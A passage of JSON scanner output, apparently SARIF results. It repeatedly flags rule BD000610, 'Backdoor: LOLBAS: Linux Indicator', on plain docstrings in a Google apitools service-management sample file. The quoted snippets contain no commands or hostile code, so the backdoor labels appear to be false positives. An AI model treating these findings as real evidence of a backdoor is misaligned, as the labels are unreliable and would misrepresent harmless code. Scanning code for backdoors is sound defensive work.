                  "snippet": {
                    "text": "  r\"\"\"Request message for EnableService method.\n\n  Fields:\n    consumerId: The identity of consumer resource which service enablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n",
                    "rendered": {
                      "text": "  r\"\"\"Request message for EnableService method.\n\n  Fields:\n    consumerId: The identity of consumer resource which service enablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n",
                      "markdown": "`  r\"\"\"Request message for EnableService method.\n\n  Fields:\n    consumerId: The identity of consumer resource which service enablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 778,
                  "startColumn": 36,
                  "endLine": 778,
                  "endColumn": 45,
                  "snippet": {
                    "text": "  Fields:\n    baseLimit: The service's configuration for this quota limit.\n    effectiveLimit: The effective limit value, based on the stored producer\n      and consumer overrides and the service defaults.\n    key: The key used to identify this limit when applying overrides. The\n      consumer_overrides and producer_overrides maps are keyed by strings of\n      the form \"QuotaGroupName/QuotaLimitName\".\n",
                    "rendered": {
                      "text": "  Fields:\n    baseLimit: The service's configuration for this quota limit.\n    effectiveLimit: The effective limit value, based on the stored producer\n      and consumer overrides and the service defaults.\n    key: The key used to identify this limit when applying overrides. The\n      consumer_overrides and producer_overrides maps are keyed by strings of\n      the form \"QuotaGroupName/QuotaLimitName\".\n",
                      "markdown": "`  Fields:\n    baseLimit: The service's configuration for this quota limit.\n    effectiveLimit: The effective limit value, based on the stored producer\n      and consumer overrides and the service defaults.\n    key: The key used to identify this limit when applying overrides. The\n      consumer_overrides and producer_overrides maps are keyed by strings of\n      the form \"QuotaGroupName/QuotaLimitName\".\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 772,
                  "startColumn": 18,
                  "endLine": 772,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\nclass EffectiveQuotaLimit(_messages.Message):\n  r\"\"\"An effective quota limit contains the metadata for a quota limit as\n  derived from the service config, together with fields that describe the\n  effective limit value and what overrides can be applied to it.\n\n  Fields:\n",
                    "rendered": {
                      "text": "\nclass EffectiveQuotaLimit(_messages.Message):\n  r\"\"\"An effective quota limit contains the metadata for a quota limit as\n  derived from the service config, together with fields that describe the\n  effective limit value and what overrides can be applied to it.\n\n  Fields:\n",
                      "markdown": "`\nclass EffectiveQuotaLimit(_messages.Message):\n  r\"\"\"An effective quota limit contains the metadata for a quota limit as\n  derived from the service config, together with fields that describe the\n  effective limit value and what overrides can be applied to it.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 740,
                  "startColumn": 18,
                  "endLine": 740,
                  "endColumn": 27,
                  "snippet": {
                    "text": "    BillingInteractionValueValuesEnum:\n\n  Fields:\n    baseGroup: The service configuration for this quota group, minus the quota\n      limits, which are replaced by the effective limits below.\n    billingInteraction: A BillingInteractionValueValuesEnum attribute.\n    quotas: The usage and limit information for each limit within this quota\n",
                    "rendered": {
                      "text": "    BillingInteractionValueValuesEnum:\n\n  Fields:\n    baseGroup: The service configuration for this quota group, minus the quota\n      limits, which are replaced by the effective limits below.\n    billingInteraction: A BillingInteractionValueValuesEnum attribute.\n    quotas: The usage and limit information for each limit within this quota\n",
                      "markdown": "`    BillingInteractionValueValuesEnum:\n\n  Fields:\n    baseGroup: The service configuration for this quota group, minus the quota\n      limits, which are replaced by the effective limits below.\n    billingInteraction: A BillingInteractionValueValuesEnum attribute.\n    quotas: The usage and limit information for each limit within this quota\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 733,
                  "startColumn": 63,
                  "endLine": 734,
                  "snippet": {
                    "text": "class EffectiveQuotaGroup(_messages.Message):\n  r\"\"\"An effective quota group contains both the metadata for a quota group as\n  derived from the service config, and the effective limits in that group as\n  calculated from producer and consumer overrides together with service\n  defaults.\n\n  Enums:\n    BillingInteractionValueValuesEnum:\n",
                    "rendered": {
                      "text": "class EffectiveQuotaGroup(_messages.Message):\n  r\"\"\"An effective quota group contains both the metadata for a quota group as\n  derived from the service config, and the effective limits in that group as\n  calculated from producer and consumer overrides together with service\n  defaults.\n\n  Enums:\n    BillingInteractionValueValuesEnum:\n",
                      "markdown": "`class EffectiveQuotaGroup(_messages.Message):\n  r\"\"\"An effective quota group contains both the metadata for a quota group as\n  derived from the service config, and the effective limits in that group as\n  calculated from producer and consumer overrides together with service\n  defaults.\n\n  Enums:\n    BillingInteractionValueValuesEnum:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 732,
                  "startColumn": 18,
                  "endLine": 732,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\nclass EffectiveQuotaGroup(_messages.Message):\n  r\"\"\"An effective quota group contains both the metadata for a quota group as\n  derived from the service config, and the effective limits in that group as\n  calculated from producer and consumer overrides together with service\n  defaults.\n\n",
                    "rendered": {
                      "text": "\nclass EffectiveQuotaGroup(_messages.Message):\n  r\"\"\"An effective quota group contains both the metadata for a quota group as\n  derived from the service config, and the effective limits in that group as\n  calculated from producer and consumer overrides together with service\n  defaults.\n\n",
                      "markdown": "`\nclass EffectiveQuotaGroup(_messages.Message):\n  r\"\"\"An effective quota group contains both the metadata for a quota group as\n  derived from the service config, and the effective limits in that group as\n  calculated from producer and consumer overrides together with service\n  defaults.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 699,
                  "startColumn": 40,
                  "endLine": 699,
                  "endColumn": 49,
                  "snippet": {
                    "text": "      `pages` field.\n    pages: The top level pages for the documentation set.\n    rules: Documentation rules for individual elements of the service.\n    summary: A short summary of what the service does. Can only be provided by\n      plain text.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      `pages` field.\n    pages: The top level pages for the documentation set.\n    rules: Documentation rules for individual elements of the service.\n    summary: A short summary of what the service does. Can only be provided by\n      plain text.\n  \"\"\"\n\n",
                      "markdown": "`      `pages` field.\n    pages: The top level pages for the documentation set.\n    rules: Documentation rules for individual elements of the service.\n    summary: A short summary of what the service does. Can only be provided by\n      plain text.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 697,
                  "startColumn": 14,
                  "endLine": 697,
                  "endColumn": 19,
                  "snippet": {
                    "text": "      ...   pages:   - name: Overview     content: &#40;== include overview.md\n      ==&#41; </code></pre> Note: you cannot specify both `overview` field and\n      `pages` field.\n    pages: The top level pages for the documentation set.\n    rules: Documentation rules for individual elements of the service.\n    summary: A short summary of what the service does. Can only be provided by\n      plain text.\n",
                    "rendered": {
                      "text": "      ...   pages:   - name: Overview     content: &#40;== include overview.md\n      ==&#41; </code></pre> Note: you cannot specify both `overview` field and\n      `pages` field.\n    pages: The top level pages for the documentation set.\n    rules: Documentation rules for individual elements of the service.\n    summary: A short summary of what the service does. Can only be provided by\n      plain text.\n",
                      "markdown": "`      ...   pages:   - name: Overview     content: &#40;== include overview.md\n      ==&#41; </code></pre> Note: you cannot specify both `overview` field and\n      `pages` field.\n    pages: The top level pages for the documentation set.\n    rules: Documentation rules for individual elements of the service.\n    summary: A short summary of what the service does. Can only be provided by\n      plain text.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 686,
                  "startColumn": 26,
                  "endLine": 686,
                  "endColumn": 35,
                  "snippet": {
                    "text": "  to infer the resource from the operations in a collection:\n  <pre><code>&#40;== resource_for v1.shelves.books ==&#41;</code></pre> The\n  directive `suppress_warning` does not directly affect documentation and is\n  documented together with service config validation.\n\n  Fields:\n    documentationRootUrl: The URL to the root of documentation.\n",
                    "rendered": {
                      "text": "  to infer the resource from the operations in a collection:\n  <pre><code>&#40;== resource_for v1.shelves.books ==&#41;</code></pre> The\n  directive `suppress_warning` does not directly affect documentation and is\n  documented together with service config validation.\n\n  Fields:\n    documentationRootUrl: The URL to the root of documentation.\n",
                      "markdown": "`  to infer the resource from the operations in a collection:\n  <pre><code>&#40;== resource_for v1.shelves.books ==&#41;</code></pre> The\n  directive `suppress_warning` does not directly affect documentation and is\n  documented together with service config validation.\n\n  Fields:\n    documentationRootUrl: The URL to the root of documentation.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 643,
                  "startColumn": 37,
                  "endLine": 643,
                  "endColumn": 46,
                  "snippet": {
                    "text": "\n  Fields:\n    consumerId: The identity of consumer resource which service disablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n      google.api.servicecontrol.v1.Operation.consumer_id.\n",
                    "rendered": {
                      "text": "\n  Fields:\n    consumerId: The identity of consumer resource which service disablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n      google.api.servicecontrol.v1.Operation.consumer_id.\n",
                      "markdown": "`\n  Fields:\n    consumerId: The identity of consumer resource which service disablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n      google.api.servicecontrol.v1.Operation.consumer_id.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 642,
                  "startColumn": 55,
                  "endLine": 642,
                  "endColumn": 64,
                  "snippet": {
                    "text": "  r\"\"\"Request message for DisableService method.\n\n  Fields:\n    consumerId: The identity of consumer resource which service disablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n",
                    "rendered": {
                      "text": "  r\"\"\"Request message for DisableService method.\n\n  Fields:\n    consumerId: The identity of consumer resource which service disablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n",
                      "markdown": "`  r\"\"\"Request message for DisableService method.\n\n  Fields:\n    consumerId: The identity of consumer resource which service disablement\n      will be applied to.  The Google Service Management implementation\n      accepts the following forms: \"project:<project_id>\",\n      \"project_number:<project_number>\".  Note: this is made compatible with\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 600,
                  "startColumn": 65,
                  "endLine": 600,
                  "endColumn": 74,
                  "snippet": {
                    "text": "      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n      account. For Example, 123456-7890ab-cdef12.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer projects owned by the customer collectively.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n",
                    "rendered": {
                      "text": "      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n      account. For Example, 123456-7890ab-cdef12.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer projects owned by the customer collectively.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n",
                      "markdown": "`      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n      account. For Example, 123456-7890ab-cdef12.\n    quotaSettings: Settings that control how much or how fast the service can\n      be used by the consumer projects owned by the customer collectively.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 595,
                  "startColumn": 53,
                  "endLine": 595,
                  "endColumn": 62,
                  "snippet": {
                    "text": "  uses a service\n\n  Fields:\n    customerId: ID for the customer that consumes the service (see above). The\n      supported types of customers are:  1. domain:{domain} A Google Apps\n      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n",
                    "rendered": {
                      "text": "  uses a service\n\n  Fields:\n    customerId: ID for the customer that consumes the service (see above). The\n      supported types of customers are:  1. domain:{domain} A Google Apps\n      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n",
                      "markdown": "`  uses a service\n\n  Fields:\n    customerId: ID for the customer that consumes the service (see above). The\n      supported types of customers are:  1. domain:{domain} A Google Apps\n      domain name. For example, google.com.  2.\n      billingAccount:{billing_account_id} A Google Cloud Plafrom billing\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 592,
                  "startColumn": 8,
                  "endLine": 593,
                  "snippet": {
                    "text": "\nclass CustomerSettings(_messages.Message):\n  r\"\"\"Settings that control how a customer (identified by a billing account)\n  uses a service\n\n  Fields:\n    customerId: ID for the customer that consumes the service (see above). The\n      supported types of customers are:  1. domain:{domain} A Google Apps\n",
                    "rendered": {
                      "text": "\nclass CustomerSettings(_messages.Message):\n  r\"\"\"Settings that control how a customer (identified by a billing account)\n  uses a service\n\n  Fields:\n    customerId: ID for the customer that consumes the service (see above). The\n      supported types of customers are:  1. domain:{domain} A Google Apps\n",
                      "markdown": "`\nclass CustomerSettings(_messages.Message):\n  r\"\"\"Settings that control how a customer (identified by a billing account)\n  uses a service\n\n  Fields:\n    customerId: ID for the customer that consumes the service (see above). The\n      supported types of customers are:  1. domain:{domain} A Google Apps\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 547,
                  "startColumn": 63,
                  "endLine": 548,
                  "snippet": {
                    "text": "\n\nclass CustomError(_messages.Message):\n  r\"\"\"Customize service error responses.  For example, list any service\n  specific protobuf types that can appear in error detail lists of error\n  responses.  Example:      custom_error:       types:       -\n  google.foo.v1.CustomError       - google.foo.v1.AnotherError\n\n",
                    "rendered": {
                      "text": "\n\nclass CustomError(_messages.Message):\n  r\"\"\"Customize service error responses.  For example, list any service\n  specific protobuf types that can appear in error detail lists of error\n  responses.  Example:      custom_error:       types:       -\n  google.foo.v1.CustomError       - google.foo.v1.AnotherError\n\n",
                      "markdown": "`\n\nclass CustomError(_messages.Message):\n  r\"\"\"Customize service error responses.  For example, list any service\n  specific protobuf types that can appear in error detail lists of error\n  responses.  Example:      custom_error:       types:       -\n  google.foo.v1.CustomError       - google.foo.v1.AnotherError\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 547,
                  "startColumn": 15,
                  "endLine": 547,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n\nclass CustomError(_messages.Message):\n  r\"\"\"Customize service error responses.  For example, list any service\n  specific protobuf types that can appear in error detail lists of error\n  responses.  Example:      custom_error:       types:       -\n  google.foo.v1.CustomError       - google.foo.v1.AnotherError\n",
                    "rendered": {
                      "text": "\n\nclass CustomError(_messages.Message):\n  r\"\"\"Customize service error responses.  For example, list any service\n  specific protobuf types that can appear in error detail lists of error\n  responses.  Example:      custom_error:       types:       -\n  google.foo.v1.CustomError       - google.foo.v1.AnotherError\n",
                      "markdown": "`\n\nclass CustomError(_messages.Message):\n  r\"\"\"Customize service error responses.  For example, list any service\n  specific protobuf types that can appear in error detail lists of error\n  responses.  Example:      custom_error:       types:       -\n  google.foo.v1.CustomError       - google.foo.v1.AnotherError\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 538,
                  "startColumn": 22,
                  "endLine": 538,
                  "endColumn": 31,
                  "snippet": {
                    "text": "\n  Fields:\n    diagnostics: Any errors or warnings that occured during config conversion.\n    serviceConfig: The service configuration. Not set if errors occured during\n      conversion.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "\n  Fields:\n    diagnostics: Any errors or warnings that occured during config conversion.\n    serviceConfig: The service configuration. Not set if errors occured during\n      conversion.\n  \"\"\"\n\n",
                      "markdown": "`\n  Fields:\n    diagnostics: Any errors or warnings that occured during config conversion.\n    serviceConfig: The service configuration. Not set if errors occured during\n      conversion.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 496,
                  "startColumn": 5,
                  "endLine": 496,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      type is OpenApiSpec\n    openApiSpec: The OpenAPI specification for an API.\n    serviceName: The service name to use for constructing the normalized\n      service configuration equivalent of the provided configuration\n      specification.\n    swaggerSpec: The swagger specification for an API.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      type is OpenApiSpec\n    openApiSpec: The OpenAPI specification for an API.\n    serviceName: The service name to use for constructing the normalized\n      service configuration equivalent of the provided configuration\n      specification.\n    swaggerSpec: The swagger specification for an API.\n  \"\"\"\n",
                      "markdown": "`      type is OpenApiSpec\n    openApiSpec: The OpenAPI specification for an API.\n    serviceName: The service name to use for constructing the normalized\n      service configuration equivalent of the provided configuration\n      specification.\n    swaggerSpec: The swagger specification for an API.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 495,
                  "startColumn": 20,
                  "endLine": 495,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    configSpec: Input configuration For this version of API, the supported\n      type is OpenApiSpec\n    openApiSpec: The OpenAPI specification for an API.\n    serviceName: The service name to use for constructing the normalized\n      service configuration equivalent of the provided configuration\n      specification.\n    swaggerSpec: The swagger specification for an API.\n",
                    "rendered": {
                      "text": "    configSpec: Input configuration For this version of API, the supported\n      type is OpenApiSpec\n    openApiSpec: The OpenAPI specification for an API.\n    serviceName: The service name to use for constructing the normalized\n      service configuration equivalent of the provided configuration\n      specification.\n    swaggerSpec: The swagger specification for an API.\n",
                      "markdown": "`    configSpec: Input configuration For this version of API, the supported\n      type is OpenApiSpec\n    openApiSpec: The OpenAPI specification for an API.\n    serviceName: The service name to use for constructing the normalized\n      service configuration equivalent of the provided configuration\n      specification.\n    swaggerSpec: The swagger specification for an API.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 477,
                  "startColumn": 20,
                  "endLine": 477,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n",
                      "markdown": "`  monitoring, etc.\n\n  Fields:\n    environment: The service control environment to use. If empty, no control\n      plane feature (like quota and billing) will be enabled.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 473,
                  "startColumn": 1,
                  "endLine": 473,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\nclass Control(_messages.Message):\n  r\"\"\"Selects and configures the service controller used by the service.  The\n  service controller handles features like abuse, quota, billing, logging,\n  monitoring, etc.\n\n  Fields:\n",
                    "rendered": {
                      "text": "\nclass Control(_messages.Message):\n  r\"\"\"Selects and configures the service controller used by the service.  The\n  service controller handles features like abuse, quota, billing, logging,\n  monitoring, etc.\n\n  Fields:\n",
                      "markdown": "`\nclass Control(_messages.Message):\n  r\"\"\"Selects and configures the service controller used by the service.  The\n  service controller handles features like abuse, quota, billing, logging,\n  monitoring, etc.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 472,
                  "startColumn": 32,
                  "endLine": 472,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n\nclass Control(_messages.Message):\n  r\"\"\"Selects and configures the service controller used by the service.  The\n  service controller handles features like abuse, quota, billing, logging,\n  monitoring, etc.\n\n",
                    "rendered": {
                      "text": "\n\nclass Control(_messages.Message):\n  r\"\"\"Selects and configures the service controller used by the service.  The\n  service controller handles features like abuse, quota, billing, logging,\n  monitoring, etc.\n\n",
                      "markdown": "`\n\nclass Control(_messages.Message):\n  r\"\"\"Selects and configures the service controller used by the service.  The\n  service controller handles features like abuse, quota, billing, logging,\n  monitoring, etc.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
